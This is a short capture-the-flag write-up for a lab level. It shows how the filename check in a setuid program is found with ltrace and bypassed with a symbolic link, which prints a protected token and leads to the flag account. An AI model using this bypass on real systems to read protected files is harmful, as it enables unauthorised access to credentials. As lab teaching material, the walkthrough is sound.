**we have a program and a file named token lets test it**

```sh
$: ./level08
level08 [file to read]
```

```sh
$: ./level08 tokken
You may not access 'token'
```

```sh
$: ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

**the program should be able to read the token file so there is something in the code preventing us to do so**
**let's find out with trace command**

```sh
$: ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                        = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                    = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

**so the code check for file named token**
**we just need to send the token file with another name**
**since we can't modifie the name of the file let's do a symbolic link**

```sh
$: ln -s /home/user/level08/token /tmp/file
$: ./level08 /tmp/file
quif5eloekouj29ke0vouxean
```

```sh
su flag08 && getflag
```
